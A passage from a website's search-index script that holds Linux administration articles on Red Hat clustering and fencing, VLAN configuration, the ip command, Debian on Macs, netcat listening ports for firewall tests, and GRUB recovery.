Testing devices in cluster volumes... DEBUG: pv_name = /dev/sda1 Attempted to register with devices: ------------------------------------- /dev/sda1 Failure ------------------------------------- Number of devices tested: 1 Number of devices passed: 0 Number of devices failed: 1 Fencing on virtual machines linkIf your fencing is not done via RACs (Remote Access Card), and you are using Xen or KVM for example, you will need to resort to software fencing by directly calling the hypervisor to shoot down a node. Let’s see how to proceed.\nWe install cman on the host machine if your cluster nodes are on a virtual machine:\nyum install cman And we copy the content of one of my nodes /etc/cluster/* to my luci machine:\nscp node1.deimos.fr:/etc/cluster/fence_xvm.key /etc/cluster/ If this key doesn’t exist, you can recreate it like this:\ndd if=/dev/urandom of=/etc/cluster/fence-xvm.key bs=4k count=1 Then copy it as explained above.\nThen we have “Shared fence devices” which appears in the interface. Now we click on add and choose virtual:\nThen we configure the “Main Fencing Method” for each node (in domain).\nFailover domains allows you to put a group of machines to a given application so that an application can only start on one of its groups of machines.\nIf you use Xen and want to be able to reboot a VM, you will need to add this:\n/sbin/fence_xvmd -L -I -L: listens on the network and nodes, but is not a member of the clusters -I : put the name of the network interface corresponding to the cluster Failover domains linkAllows you to create groups of nodes on which services will be allowed to switch.\nExample configuration file link \u003c?xml version=\"1.0\"?\u003e Manually updating the configuration linkYou can manually change the cluster configuration:\nCLUSTER |__CMAN or GULM (RHEL4 only) | |__LOCKSERVER (Only for GULM; 1,3,4 or 5 only) | |__FENCE_XVMD (RHEL5 option, used when hosting a virtual cluster) | |__CLUSTERNODES | |_____CLUSTERNODE+ | |______FENCE | |__METHOD+ | |___DEVICE+ | |__FENCEDEVICES | |______FENCEDEVICE+ | |__RM (Resource Manager Block) | |__FAILOVERDOMAINS | | |_______FAILOVERDOMAIN* | | |________FAILOVERDOMAINNODE* | |__RESOURCES | | |_____(See Resource List Below) | |__SERVICE* | |__FENCE_DAEMON Then once you’re satisfied, change the version value + 1:\nThen update this configuration on all nodes:\nOn RHEL 5, go to the node in question, then: ccs_tool update /etc/cluster/cluster.conf On RHEL 6: ccs -h -p --sync --activate host: the node on which the action should be done password: the ricci password –sync: synchronize the configuration file on all nodes –activate: activate the new configuration cman linkView the status of the cluster:\n\u003e cman_tool status Version: 6.2.0 Config Version: 14 Cluster Name: cluster1 Cluster Id: 26777 Cluster Member: Yes Cluster Generation: 12 Membership state: Cluster-Member Nodes: 3 Expected votes: 3 Total votes: 3 Quorum: 2 Active subsystems: 9 Flags: Dirty Ports Bound: 0 11 177 Node name: node1.deimos.fr Node ID: 2 Multicast addresses: 239.192.104.2 Node addresses: 10.0.0.1 View the status of nodes:\ncman_tool nodes View the status of services:\ncman_tool services Register a node in the cluster:\ncman_tool join To remove a node from the cluster (no services should be running on this node):\ncman_tool leave We can test the fencing (reboot) on a machine:\ncman_tool kill -n node2.deimos.fr Managing cluster services linkHere is the order of starting the services, so if you have a problem, check these services:\nservice cman start service qdiskd start service clvmd start service gfs start service rgmanager start service ricci start And vice versa for shutdown.\nHere’s a little script that will only turn on the useful services in case of non-cluster boot or problems:\n#!/bin/sh for i in cman qdiskd clvmd gfs rgmanager ricci ; do if [ $(chkconfig --list | grep $i | grep -c on) -ge 1 ]; then service $i start fi done Then run it.\nPreventing a node from joining the cluster at reboot linkIt is possible to prevent a node from rejoining a cluster like this:\nfor i in rgmanagers gfs clvmd qdiskq cman ; do chkconfig --level 2345 $i off done Cluster shutdown linkBe careful if you are using GFS, to completely shut down your cluster, you need to lower the “quorum expected” value to avoid problems when you shut down your nodes one by one. Otherwise you will not be able to unmount your GFS at all!\nSolution 1 (recommended): For example, on a 3-node cluster, your quorum is at 3 for example, lower your quorum:\ncman_tool expected 2 Turn off one of your nodes, lower the quorum again:\ncman_tool expected 1 Then you can unmount everything and shut down your nodes.\nSolution 2 (avoid): You can run the following command which will take each node out of the cluster and therefore we can properly shut them down, but there is a risk of splitbrain:\ncman_tool leave remove Usage linkLuci linkInitialization linkIf you are on Red Hat 5, we need to create the first user for Luci:\n\u003e luci_admin init Initializing the luci server Creating the 'admin' user Enter password: Confirm password: Please wait... The admin password has been successfully set. Generating SSL certificates... The luci server has been successfully initialized You must restart the luci server for changes to take effect. Run \"service luci restart\" to do so Then start the service:\nservice luci restart Then log in http://luci:8084\nUse admin with the password you just entered via the luci_admin command if you are on RHEL 5 If you are on RHEL 6, just use the root login and password Creating a cluster linkTo create a cluster, go to one of the future nodes and run the following command:\nccs -h --createcluster node1: the name of the node on which the configuration should be created (use the name of the private interface) cluster: the name of the cluster (no more than 15 characters) -f: you can specify the configuration file if you don’t want the cluster one to be overwritten Adding nodes linkTo add nodes to a cluster:\nccs -h node1 --addnode node1 ccs -h node1 --addnode node2 ccs -h node1 --addnode node3 These lines will add nodes 1 to 3 to the cluster configuration on node1.\nTo check the list of nodes:\n\u003e ccs -h node1 --lsnodes node1: nodeid=1 node2: nodeid=2 node3: nodeid=3 Fencing linkWe need to add a mandatory fencing method to be able to shoot down a node in case of a problem, so that it can reintegrate the cluster as quickly as possible and does not corrupt data on the disks.\nTo list the available fencing methods:\n\u003e ccs -h node1 --lsfenceopts fence_rps10 - RPS10 Serial Switch fence_vixel - No description available fence_egenera - No description available fence_xcat - No description available fence_na - Node Assassin fence_apc - Fence agent for APC over telnet/ssh fence_apc_snmp - Fence agent for APC over SNMP fence_bladecenter - Fence agent for IBM BladeCenter fence_bladecenter_snmp - Fence agent for IBM BladeCenter over SNMP fence_cisco_mds - Fence agent for Cisco MDS fence_cisco_ucs - Fence agent for Cisco UCS fence_drac5 - Fence agent for Dell DRAC CMC/5 fence_eps - Fence agent for ePowerSwitch fence_ibmblade - Fence agent for IBM BladeCenter over SNMP fence_ifmib - Fence agent for IF MIB fence_ilo - Fence agent for HP iLO fence_ilo_mp - Fence agent for HP iLO MP fence_intelmodular - Fence agent for Intel Modular fence_ipmilan - Fence agent for IPMI over LAN fence_kdump - Fence agent for use with kdump fence_rhevm - Fence agent for RHEV-M REST API fence_rsa - Fence agent for IBM RSA fence_sanbox2 - Fence agent for QLogic SANBox2 FC switches fence_scsi - fence agent for SCSI-3 persistent reservations fence_virsh - Fence agent for virsh fence_virt - Fence agent for virtual machines fence_vmware - Fence agent for VMWare fence_vmware_soap - Fence agent for VMWare over SOAP API fence_wti - Fence agent for WTI fence_xvm - Fence agent for virtual machines To list the possible options on a fencing method:\n\u003e ccs -h node1 --lsfenceopts fence_vmware_soap fence_vmware_soap - Fence agent for VMWare over SOAP API Required Options: Optional Options: option: No description available action: Fencing Action ipaddr: IP Address or Hostname login: Login Name passwd: Login password or passphrase passwd_script: Script to retrieve password ssl: SSL connection port: Physical plug number or name of virtual machine uuid: The UUID of the virtual machine to fence. ipport: TCP port to use for connection with device verbose: Verbose mode debug: Write debug information to given file version: Display version information and exit help: Display help and exit separator: Separator for CSV created by operation list power_timeout: Test X seconds for status change after ON/OFF shell_timeout: Wait X seconds for cmd prompt after issuing command login_timeout: Wait X seconds for cmd prompt after login power_wait: Wait X seconds after issuing ON/OFF delay: Wait X seconds before fencing is started retry_on: Count of attempts to retry power on Here’s how to add a fencing method for Vmware:\nccs -h node1 --addfencedev agent=fence_vmware_soap ipaddr= login= password= vmware_fence: name you want to give to fencing For Vmware, we only need one. But if you have RACs, you will need to specify information for each of them.\nIf you want to remove one:\nccs -h node1 --rmfencedev Adding fencing for nodes linkAbove, we have declared the fencing methods. Now we need to add them to each of our nodes:\nccs -h node1 --addmethod node1 ccs -h node1 --addfenceinst port=node1 ssl=on uuid=412921c1-c259-f9a4-0ee2-37cc047eb4ed ccs -h node1 --addmethod node2 ccs -h node1 --addfenceinst port=node2 ssl=on uuid=422921c1-c259-f9a4-0ee2-37cc047eb4ed ccs -h node1 --addmethod node3 ccs -h node1 --addfenceinst port=node3 ssl=on uuid=432921c1-c259-f9a4-0ee2-37cc047eb4ed Note: Here’s a PowerShell command with PowerCLI to retrieve the UUIDs of VMs:\nGet-VM | %{(Get-View $_.Id).config.uuid} Creating a service link–\u003e creation of a typical service\nOnce our service is created, all that’s left is to do the clustat:\n\u003e clustat Cluster Status for cluster1 @ Tue Feb 29 13:50:09 2012 Member Status: Quorate Member Name ID Status ------ ---- ---- ------ node2.deimos.fr 1 Online, rgmanager node1.deimos.fr 2 Online, Local, rgmanager Service Name Owner (Last) State ------- ---- ----- ------ ----- service:apache node2.deimos.fr started NFS linkFor clustering with NFS, it’s a bit special, you need:\nA file system NFS export: monnfs NFS client: Name: monnfs Target: the IPs allowed to connect Options: ro/rw As dependencies, here’s what it should look like:\nFS NFS Export NFS Client rgmanager linkThe cluster scripts (resource types) available are in OCF (Open Cluster Framework) format and the scripts are available in /usr/share/cluster/.\nWhen you create a service (Resource Group), you can create multiple resources and associate them or create dependencies on each other to define a startup order. You can retrieve the predefined information related to resource types in /usr/share/cluster/service.sh\nManaging services/RG linkEnable a service:\nclusvcadm -e -m Disable a service:\nclusvcadm -d Relocate a service to another node:\nclusvcadm -r -m Resources Recovery linkBy default it tries to restart the service on the same node, but there is also:\nrelocate: it will try to switch it to another node disable: takes no actions in case of problems Check Status linkThe status must be performed on each resource, which is by default at 30 seconds. You should absolutely not go below 5s. You can modify all these default values in /usr/share/cluster/*.\nThe lines to modify look like:\nYou can change the check interval and the timeout if you want one.\nCustom scripts linkYou can develop your own scripts, and they must be able to respond to start, stop, restart and status. Additionally, return codes must be handled correctly.\nMonitoring linkYou can monitor in several ways:\nVia the clustat command Via SNMP Clustat linkThis command shows the state of the cluster:\n\u003e clustat Cluster Status for cluster1 @ Thu Mar 1 09:45:21 2012 Member Status: Quorate Member Name ID Status ------ ---- ---- ------ node2.deimos.fr 1 Online, rgmanager node1.deimos.fr 2 Online, Local, rgmanager node3.deimos.fr 3 Online, rgmanager Service Name Owner (Last) State ------- ---- ----- ------ ----- service:websrv (none) And you can do an XML export:\n\u003e clustat -x \u003c?xml version=\"1.0\"?\u003e For states, here is the information:\nStarted: the service is started Pending: the service is starting Disabled: the service is disabled Stopped: the service is temporarily stopped Failed: the service could not start properly SNMP linkInstallation linkYou can query the cluster via SNMP. You will need to install this on the nodes:\nyum install cluster-snmp net-snmp Configuration linkYou can read the file /usr/share/doc/cluster-snmp-0.12.1/README.snmpd which contains the 2 configuration lines for SNMP:\n... ###################################### ## cluster monitoring configuration ## ###################################### dlmod RedHatCluster /usr/lib/cluster-snmp/libClusterMonitorSnmp.so view systemview included REDHAT-CLUSTER-MIB:RedHatCluster ... And add them to your SNMP configuration file:\ndlmod RedHatCluster /usr/lib/cluster-snmp/libClusterMonitorSnmp.so view systemview included REDHAT-CLUSTER-MIB:RedHatCluster Restart your SNMP service. Now we will be able to query the cluster (requires net-snmp-utils for the client):\n\u003e snmpwalk -v1 -c public localhost REDHAT-CLUSTER-MIB:RedHatCluster REDHAT-CLUSTER-MIB::rhcMIBVersion.0 = INTEGER: 1 REDHAT-CLUSTER-MIB::rhcClusterName.0 = STRING: \"cluster1\" REDHAT-CLUSTER-MIB::rhcClusterStatusCode.0 = INTEGER: 4 REDHAT-CLUSTER-MIB::rhcClusterStatusDesc.0 = STRING: \"Some services not running\" REDHAT-CLUSTER-MIB::rhcClusterVotesNeededForQuorum.0 = INTEGER: 2 REDHAT-CLUSTER-MIB::rhcClusterVotes.0 = INTEGER: 3 REDHAT-CLUSTER-MIB::rhcClusterQuorate.0 = INTEGER: 1 REDHAT-CLUSTER-MIB::rhcClusterNodesNum.0 = INTEGER: 3 REDHAT-CLUSTER-MIB::rhcClusterNodesNames.0 = STRING: \"node1.deimos.fr, node2.deimos.fr, node3.deimos.fr\" REDHAT-CLUSTER-MIB::rhcClusterAvailNodesNum.0 = INTEGER: 3 REDHAT-CLUSTER-MIB::rhcClusterAvailNodesNames.0 = STRING: \"node1.deimos.fr, node2.deimos.fr, node3.deimos.fr\" REDHAT-CLUSTER-MIB::rhcClusterUnavailNodesNum.0 = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcClusterUnavailNodesNames.0 = \"\" REDHAT-CLUSTER-MIB::rhcClusterServicesNum.0 = INTEGER: 1 REDHAT-CLUSTER-MIB::rhcClusterServicesNames.0 = STRING: \"webby\" REDHAT-CLUSTER-MIB::rhcClusterRunningServicesNum.0 = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcClusterRunningServicesNames.0 = \"\" REDHAT-CLUSTER-MIB::rhcClusterStoppedServicesNum.0 = INTEGER: 1 REDHAT-CLUSTER-MIB::rhcClusterStoppedServicesNames.0 = STRING: \"webby\" REDHAT-CLUSTER-MIB::rhcClusterFailedServicesNum.0 = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcClusterFailedServicesNames.0 = \"\" REDHAT-CLUSTER-MIB::rhcNodeName.\"node1.deimos.fr\" = STRING: \"node1.deimos.fr\" REDHAT-CLUSTER-MIB::rhcNodeName.\"node2.deimos.fr\" = STRING: \"node2.deimos.fr\" REDHAT-CLUSTER-MIB::rhcNodeName.\"node3.deimos.fr\" = STRING: \"node3.deimos.fr\" REDHAT-CLUSTER-MIB::rhcNodeStatusCode.\"node1.deimos.fr\" = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcNodeStatusCode.\"node2.deimos.fr\" = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcNodeStatusCode.\"node3.deimos.fr\" = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcNodeStatusDesc.\"node1.deimos.fr\" = STRING: \"Participating in cluster\" REDHAT-CLUSTER-MIB::rhcNodeStatusDesc.\"node2.deimos.fr\" = STRING: \"Participating in cluster\" REDHAT-CLUSTER-MIB::rhcNodeStatusDesc.\"node3.deimos.fr\" = STRING: \"Participating in cluster\" REDHAT-CLUSTER-MIB::rhcNodeRunningServicesNum.\"node1.deimos.fr\" = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcNodeRunningServicesNum.\"node2.deimos.fr\" = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcNodeRunningServicesNum.\"node3.deimos.fr\" = INTEGER: 0 REDHAT-CLUSTER-MIB::rhcNodeRunningServicesNames.\"node1.deimos.fr\" = \"\" REDHAT-CLUSTER-MIB::rhcNodeRunningServicesNames.\"node2.deimos.fr\" = \"\" REDHAT-CLUSTER-MIB::rhcNodeRunningServicesNames.\"node3.deimos.fr\" = \"\" REDHAT-CLUSTER-MIB::rhcServiceName.\"webby\" = STRING: \"webby\" REDHAT-CLUSTER-MIB::rhcServiceStatusCode.\"webby\" = INTEGER: 1 REDHAT-CLUSTER-MIB::rhcServiceStatusDesc.\"webby\" = STRING: \"stopped\" REDHAT-CLUSTER-MIB::rhcServiceStartMode.\"webby\" = STRING: \"manual\" REDHAT-CLUSTER-MIB::rhcServiceRunningOnNode.\"webby\" = \"\" End of MIB To get the SNMP cluster hierarchy:\n\u003e snmptranslate -Os -Tp REDHAT-CLUSTER-MIB:RedHatCluster +--RedHatCluster(8) | +--rhcMIBInfo(1) | | | +-- -R-- Integer32 rhcMIBVersion(1) | +--rhcCluster(2) | | | +-- -R-- String rhcClusterName(1) | +-- -R-- Integer32 rhcClusterStatusCode(2) | +-- -R-- String rhcClusterStatusDesc(3) | +-- -R-- Integer32 rhcClusterVotesNeededForQuorum(4) | +-- -R-- Integer32 rhcClusterVotes(5) | +-- -R-- Integer32 rhcClusterQuorate(6) | +-- -R-- Integer32 rhcClusterNodesNum(7) | +-- -R-- String rhcClusterNodesNames(8) | +-- -R-- Integer32 rhcClusterAvailNodesNum(9) | +-- -R-- String rhcClusterAvailNodesNames(10) | +-- -R-- Integer32 rhcClusterUnavailNodesNum(11) | +-- -R-- String rhcClusterUnavailNodesNames(12) | +-- -R-- Integer32 rhcClusterServicesNum(13) | +-- -R-- String rhcClusterServicesNames(14) | +-- -R-- Integer32 rhcClusterRunningServicesNum(15) | +-- -R-- String rhcClusterRunningServicesNames(16) | +-- -R-- Integer32 rhcClusterStoppedServicesNum(17) ... FAQ linkLogs linkThe logs are in /var/log/messages, and the verbosity level can be adjusted in /etc/cluster/cluster.conf.\nYou can then test your cluster log level like this:\nclulog -s warning \"test\" Common errors linkHere is a list of the most common errors:\nPoorly written custom scripts that don’t return the correct values Is the service being checked too often? Are resources starting in the right order? Starting cman… Can’t determine address family of nodename linkIf you have this kind of message when starting cman:\n\u003e service cman start Starting cluster: Checking if cluster has been disabled at boot... [ OK ] Checking Network Manager... [ OK ] Global setup... [ OK ] Loading kernel modules... [ OK ] Mounting configfs... [ OK ] Starting cman... Can't determine address family of nodename Unable to get the configuration Can't determine address family of nodename cman_tool: corosync daemon didn't start Check cluster logs for details Check that you have hostnames configured correctly and that all nodes can communicate with each other.\nError locking on node linkYou may encounter this kind of problem if your physical volume is not detected on all nodes.\n\u003e lvcreate -n shared_lv1 -L 256M shared_vg Error locking on node node3: Volume group for uuid not found: EfDxVCE2XWh2Se7ohirVFpXyjXSEJqZxigQMWiiUXNjRXeWd2SzLHwZv3bFropf1 Error locking on node node1: Volume group for uuid not found: EfDxVCE2XWh2Se7ohirVFpXyjXSEJqZxigQMWiiUXNjRXeWd2SzLHwZv3bFropf1 Failed to activate new LV. To fix the problem, do a partprobe on the disks containing the new partition.\nCluster is not quorate. Refusing connection linkYou need to check that all cluster services have started correctly. We can check the status of the cluster like this:\n\u003e clustat Cluster Status for cluster1 @ Wed Feb 29 14:16:31 2012 Member Status: Quorate And here it is quorate, so no worries :-)\nResources linkhttp://sources.redhat.com/cluster/doc/cluster_schema.html\nhttps://alteeve.com/w/RHCS_v2_cluster.conf\nhttp://magazine.redhat.com/2007/12/19/enhancing-cluster-quorum-with-qdisk/\nhttps://access.redhat.com/knowledge/node/2881\nRHEL Cluster Archi Visio\n"
            }
        );
    index.add(
            {
                id:  336 ,
                href: "\/Mise_en_place_de_VLAN\/",
                title: "Setting up VLAN",
                description: "Guide on how to set up and configure VLAN networks on Linux systems, including OpenVZ and KVM virtualization environments.",
                content: "Introduction linkA Virtual Local Area Network, commonly known as VLAN, is a logically independent computer network. Multiple VLANs can coexist on the same network switch.\nInstallation linkFirst, you need to check if VLAN support is compiled as a module or integrated into the kernel:\n\u003e grep -i 8021q \u003c /boot/config-2.6.32-21-generic CONFIG_VLAN_8021Q=m Here it’s as a module, so I’ll activate it on the fly:\nmodprobe 8021q Then add it to the modules file to automatically load at startup:\n# /etc/modules: kernel modules to load at boot time. # # This file contains the names of kernel modules that should be loaded # at boot time, one per line. Lines beginning with \"#\" are ignored. # Parameters can be specified after the module name. 8021q ... Next, I need to install the VLAN package:\naptitude install vlan Configuration linkTo configure my VLAN, it’s quite simple. I need to know on which physical interface (br0 in this case) I’ll create my VLAN (110), then I can create my VLAN on-the-fly like this:\nvconfig add eth0 110 Then I configure the IP addresses:\nifconfig eth0.110 192.168.110.1/24 And add it permanently to the network cards configuration:\n# VLAN 110 DMZ iface eth0.110 inet static address 192.168.110.1 netmask 255.255.255.0 broadcast 192.168.110.255 vlan_raw_device eth0 OpenVZ linkHere’s an example that works with OpenVZ, but also works well for other classic use cases.\nYou may need to create VLANs in your VEs. This works very well with a bridged interface. To do this, on the host machine, you need to have a VLAN configured (for setup, use this documentation). For those who still want an example:\n# This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 auto eth0 iface eth0 inet manual # The bridged interface auto vmbr0 iface vmbr0 inet static address 192.168.100.1 netmask 255.255.255.0 gateway 192.168.100.254 broadcast 192.168.100.255 network 192.168.100.0 bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off # The DMZ Vlan 110 auto vmbr0.110 iface vmbr0.110 inet static address 192.168.110.1 netmask 255.255.255.0 broadcast 192.168.110.255 vlan_raw_device vmbr0 This example is made with a bridged interface because I have KVM running on it, but you’re not obligated to use a bridge.\nThen, when creating your VE, you don’t have to do anything special when creating the network interface for your VE. Launch the creation of your VE and don’t forget to install the “vlan” package to create VLAN access within your VE. Here’s another example of the network configuration for the VE:\n... CONFIG_CUSTOMIZED=\"yes\" VZHOSTBR=\"vmbr0\" IP_ADDRESS=\"\" NETIF=\"ifname=eth0,mac=00:18:50:FE:EF:0B,host_ifname=veth101.0,host_mac=00:18:50:07:B8:F4\" For the VE configuration, it’s almost identical to the host machine. You’ll need to create a VLAN interface on the main interface (again, you don’t need to configure the main interface, just the VLAN is enough). For those who are still unsure, here’s an example configuration in a VE:\n# This configuration file is auto-generated. # WARNING: Do not edit this file, your changes will be lost. # Please create/edit /etc/network/interfaces.head and /etc/network/interfaces.tail instead, # their contents will be inserted at the beginning and at the end # of this file, respectively. # # NOTE: it is NOT guaranteed that the contents of /etc/network/interfaces.tail # will be at the very end of this file. # Auto generated lo interface auto lo iface lo inet loopback # VE interface auto eth0 iface eth0 inet manual # VLAN 110 interface auto eth0.110 iface eth0.110 inet static address 192.168.110.2 netmask 255.255.255.0 gateway 192.168.110.254 broadcast 192.168.110.255 vlan_raw_device eth0 KVM linkWe will need to use etables (iptables for bridged interfaces). Install this:\naptitude install ebtables Check your etables configuration:\nEBTABLES_LOAD_ON_START=\"yes\" EBTABLES_SAVE_ON_STOP=\"yes\" EBTABLES_SAVE_ON_RESTART=\"yes\" And enable VLAN tagging on bridged interfaces:\nebtables -t broute -A BROUTING -i eth0 -p 802_1Q -j DROP # This file describes the network interfaces available on your system # and how to activate them. For more information, see interfaces(5). # The loopback network interface auto lo iface lo inet loopback # The primary network interface allow-hotplug eth0 auto eth0 iface eth0 inet manual auto eth0.110 iface eth0.110 inet manual vlan_raw_device eth0 # The bridged interface auto vmbr0 iface vmbr0 inet static address 192.168.100.1 netmask 255.255.255.0 network 192.168.100.0 broadcast 192.168.100.255 gateway 192.168.100.254 # dns-* options are implemented by the resolvconf package, if installed dns-nameservers 192.168.100.254 dns-search deimos.fr bridge_ports eth0 bridge_fd 9 bridge_hello 2 bridge_maxage 12 bridge_stp off auto vmbr0.110 iface vmbr0.110 inet static address 192.168.110.1 netmask 255.255.255.0 bridge_ports eth0.190 bridge_stp off bridge_maxwait 0 bridge_fd 0 Resources linkhttp://linux-net.osdl.org/index.php/VLAN\nDocumentation about VLANs\n"
            }
        );
    index.add(
            {
                id:  337 ,
                href: "\/IP_:_La_commande_de_gestion_de_sa_carte_r%C3%A9seau\/",
                title: "IP: Network Interface Management Command",
                description: "How to use the ip command to manage network interfaces, which is gradually replacing ifconfig due to its enhanced functionality.",
                content: "Introduction linkThe “ip” command is gradually replacing the ifconfig command due to its enhanced functionality. With the arrival of RHEL6, this transition is becoming more evident. In this article, we’ll see how to use this command effectively.\nUsage link View the status of all interfaces: \u003e ip link show 1: lo: mtu 16436 qdisc noqueue state UNKNOWN link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 08:00:27:9a:b6:35 brd ff:ff:ff:ff:ff:ff View the status of a specific interface (eth0 in this case): \u003e ip link show eth0 2: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 08:00:27:9a:b6:35 brd ff:ff:ff:ff:ff:ff View the status of a specific interface (eth0) with IPv4 information only (-4): \u003e ip -4 addr show eth0 2: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 inet 10.0.1.9/24 brd 10.0.1.255 scope global eth0 View detailed statistics for interface eth0: \u003e ip -s link show eth0 2: eth0: mtu 1500 qdisc pfifo_fast state UP qlen 1000 link/ether 08:00:27:9a:b6:35 brd ff:ff:ff:ff:ff:ff RX: bytes packets errors dropped overrun mcast 28627 284 0 0 0 0 TX: bytes packets errors dropped carrier collsns 40732 128 0 0 0 0 Create a virtual IP address (VIP): ip addr add 192.168.0.1/24 dev eth0 label eth0:0 Remove a virtual IP address (VIP): ip addr del 192.168.0.1/24 dev eth0 Add a VLAN and VIP on the VLAN (VLAN 90 on bond0): ip link add link bond0 name bond0:90 type vlan id 90 ip link set dev bond0:90 up ip addr add 192.168.0.1/24 dev bond0:90 "
            }
        );
    index.add(
            {
                id:  338 ,
                href: "\/Installer_Debian_sur_un_Mac_en_single_boot\/",
                title: "Installing Debian on a Mac in Single Boot",
                description: "This guide explains how to install Debian on a Mac in single boot mode, including tips for shortening boot time, setting up auto-restart after power loss, and enabling Wake on LAN.",
                content: " Operating System Debian 6 Website Debian Last Update 05/02/2012 Introduction linkThere are many methods for installing Debian on a Mac, some of which are less elegant than others. One approach that worked for me, but is quite messy, involves having an HFS+ partition with refit and Linux partitions that need to be synchronized with EFI (MBR -\u003e EFI) with each new partition.\nIn short, these are cumbersome methods. That’s why I looked into other solutions like gparted and target boot.\nInstalling Debian linkFirst, you can either boot from a gparted live CD, or like me, boot your Mac in target mode (via Firewire 1 or 2 port, holding the T key during boot). Then launch gparted on the machine connected to the Firewire, and:\nDelete the current partition table Create a new one in MBR format, not GPT Create the partitions you want and apply the configuration Reboot on the Debian CD and perform a normal installation That’s it, no more problems with flashing folders or similar issues.\nShortening Boot Time linkYou’ll quickly notice that it’s annoying to wait 30 seconds for the Mac to find the right boot partition. We can speed up this process by specifying which partition to use. To do this, you’ll need to boot from the Mac OS X installation DVD. You can use the Disk Utility to view your partitions and identify the one containing your Debian /boot directory. Then, open a terminal and run this command:\nbless --device /dev/disk0s1 --setBoot --legacy --verbose Automatically Restarting After a Power Outage linkTo make your Mac automatically restart after a power outage, add this to the rc.local file (/etc/rc.local):\n[...] # PPC Mac Mini echo server_mode=1 \u003e /proc/pmu/options # Intel Mac Mini setpci -s 0:1f.0 0xa4.b=0 # nVidia Mac Mini setpci -s 00:03.0 0x7b.b=0x19 # Unibody Mac Mini setpci -s 0:3.0 -0x7b=20 Use the line that works for your Mac.\nWake On LAN linkIf you want to enable Wake on LAN (WOL), here are the commands to add to rc.local (choose one of the three setpci lines, the one that works for your system) (/etc/rc.local):\n[...] ## Wake on Lan # Choose one of the 3 lines (use the working one) setpci -d 8086:27b9 0xa4.b=0 setpci -s 00:03.0 0xa4.b=0 setpci -s 00:03.0 0x7b.b=19 ethtool -s eth0 wol g You’ll need the ethtool command. Install the ethtool package:\naptitude install ethtool Resources linkhttp://doc.ubuntu-fr.org/installation_macbook_sans_macosx\nhttp://blog.dhampir.no/content/wake-on-lan-on-a-n-intel-mac-mini-with-linux\n"
            }
        );
    index.add(
            {
                id:  339 ,
                href: "\/Netcat_:_Cr%C3%A9er_un_port_d%27%C3%A9coute\/",
                title: "Netcat: Creating a Listening Port",
                description: "How to use Netcat to create a listening port for testing firewall configurations and network connections",
                content: "Creating a Listening Port linkHaving a server that listens is good, but when testing with a firewall and you don’t necessarily have the listening port behind it yet, you can simply use the Netcat command.\nThis command will act as if it were a server-type service that starts listening:\nnc -l numero_du_port or\nnc -lp numero_du_port The command varies depending on the version of netcat.\nIf you want the connection to remain open:\nnc -lk numero_du_port Then all you need to do is test it:\nnc @IP numero_du_port Resources linkNetcat: Remote Partition Backup\nNetcat: File Transfer\nNetcat Documentation\nUseful Uses Of netcat\n"
            }
        );
    index.add(
            {
                id:  340 ,
                href: "\/Grub_:_Utilisation_d\u0027un_bootloader\/",
                title: "GRUB: Using a Bootloader",
                description: "A comprehensive guide on using GRUB bootloader for Linux and other operating systems, including recovery methods, configuring rescue kernels, and customizing the boot splash screen.",
                content: " Software version 1 \u0026 2 Operating System Linux Website Grub Website Last Update 25/04/2012 Introduction linkGNU GRUB (acronym for “GRand Unified Bootloader”) is a boot loader program for computers. It executes when the computer is powered on, after internal control sequences and before the actual operating system, since its role is to organize the loading process. When the computer hosts several systems (known as multi-boot), it allows the user to choose which system to start.\nIt has multiple advantages. First, it’s free software. It also allows the management of systems other than Linux and Windows (useful for Hurd, Solaris, FreeBSD, and OpenBSD), reads configuration at boot time (no need to reinstall GRUB in the boot sector after a configuration change, unlike LILO), offers a command line to change configuration at boot, and especially has native recognition of various existing file systems. It also has a simple command language to “recover” a boot that would have gone wrong, due to incorrect partition addressing, for example.\nGRUB must be able to recognize all file systems on which it might be needed to boot. For this reason, it is much larger than LILO.\nIt is part of the GNU project.\nRestoring GRUB After a Problem linkGrub 1 link Boot the PC with a Debian installation disc (net install for example) At the command prompt type: rescue root=/dev/hda2 Note: hda2 corresponds to the partition where the kernel is located (/boot)\nContinue the procedure by answering the various questions about your installation Finally, choose the restore GRUB option and follow the indicated procedure Grub 2 linkOverwriting the MBR linkWhen another boot manager has taken the place of grub-pc in the MBR:\nBoot on a system that has grub-pc by default (for example the Linux live-CD) Mount the disk containing /boot/grub/grub.cfg that grub-pc will need to use (for example by going to “Shortcuts/Home Folder” and clicking on the relevant disk on the left, then ok to authorize its mounting) Then run the following command, replacing “DiskWhereIHaveMyBoot” with your mount point and /dev/sda possibly with the disk that should contain grub-pc on the MBR: sudo grub-install --root-directory=/media/DiskWhereIHaveMyBoot /dev/sda Restart by removing your live-cd or your boot USB stick. Stages and Boot Options linkHere are the different stages with options for booting in a functional mode and trying to recover from an error that prevents correct booting:\nProblem Stage Boot Option ------------------------------- BIOS | | Linux rescue GRUB | | grub shell Kernel or Initrd | | kernel .. root=LABEL=root init=/bin/bash init | | kernel .. root=LABEL=root emergency rc.sysinit | | kernel .. root=LABEL=root single rc scripts (K,S) | | kernel .. root=LABEL=root 1 rc.local | v Setting Up a Rescue Kernel linkThe idea here is to implement a solution so that if the kernel crashes at boot, it can restart on an old kernel. We will use a failback method integrated into Grub. We simply need to add a few lines (/etc/grub.conf):\n# grub.conf generated by anaconda # # Note that you do not have to rerun grub after making changes to this file # NOTICE: You have a /boot partition. This means that # all kernel and initrd paths are relative to /boot/, eg. # root (hd0,0) # kernel /vmlinuz-version ro root=/dev/mapper/myvg-rootvol # initrd /initrd-[generic-]version.img #boot=/dev/sda default=saved fallback 0 1 timeout=5 splashimage=(hd0,0)/grub/splash.xpm.gz hiddenmenu title Red Hat Enterprise Linux Server 